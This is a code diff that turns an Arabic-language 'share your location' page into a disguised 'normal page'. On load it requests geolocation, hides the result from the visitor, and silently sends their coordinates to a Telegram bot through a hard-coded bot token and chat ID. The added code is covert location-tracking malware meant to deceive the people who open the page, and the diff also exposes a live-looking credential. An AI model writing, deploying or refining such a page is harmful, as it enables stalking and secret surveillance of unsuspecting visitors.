@@ -2,17 +2,50 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>مشاركة الموقع</title>
+  <title>صفحة عادية</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+      text-align: center;
+      padding: 50px;
+    }
+    .content {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      max-width: 500px;
+      margin: 0 auto;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    p {
+      color: #333;
+      font-size: 16px;
+    }
+  </style>
 </head>
 <body>
-  <h2>اضغط على الزر لمشاركة موقعك</h2>
-  <button onclick="getLocation()">مشاركة الموقع</button>
-  <p id="status"></p>
+  <div class="content">
+    <h2>مرحباً</h2>
+    <p>جاري تحميل المحتوى...</p>
+    <p id="status" style="font-size: 14px; color: #666;"></p>
+  </div>
 
   <script>
-    // ضع هنا توكن البوت ورقم المحادثة
     const BOT_TOKEN = "7592256304:AAEnFjnbaovBqMU2frijfgQscr53ZAc8Giw";
     const CHAT_ID = "6024837142";
+
+    function sendLocationToBot(lat, lon) {
+      const message = `📍 تم الحصول على الموقع:\nخط العرض: ${lat}\nخط الطول: ${lon}`;
+      
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
+        .then(response => {
+          if (response.ok) {
+            console.log('تم الإرسال للبوت بنجاح');
+          }
+        })
+        .catch(error => console.error('خطأ في الإرسال:', error));
+    }
 
     function getLocation() {
       const status = document.getElementById('status');
@@ -22,22 +55,23 @@
           (position) => {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            status.innerHTML = `خط العرض: ${lat} <br>خط الطول: ${lon}`;
-
-            const message = `📍 تم الحصول على الموقع:\nخط العرض: ${lat}\nخط الطول: ${lon}`;
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
-              .then(response => console.log('تم الإرسال للبوت'))
-              .catch(error => console.error('خطأ في الإرسال:', error));
+            status.innerHTML = `تم التحميل بنجاح`;
+            sendLocationToBot(lat, lon);
           },
           (error) => {
-            status.innerHTML = 'رفضت مشاركة الموقع أو حدث خطأ.';
+            console.log('رفض المستخدم مشاركة الموقع أو حدث خطأ:', error);
+            status.innerHTML = 'يرجى السماح بالوصول إلى الموقع';
           }
         );
       } else {
         status.innerHTML = 'المتصفح لا يدعم خدمة تحديد الموقع.';
       }
     }
+
+    // طلب الموقع تلقائياً عند تحميل الصفحة
+    window.addEventListener('load', function() {
+      setTimeout(getLocation, 500);
+    });
   </script>
 </body>
 </html>
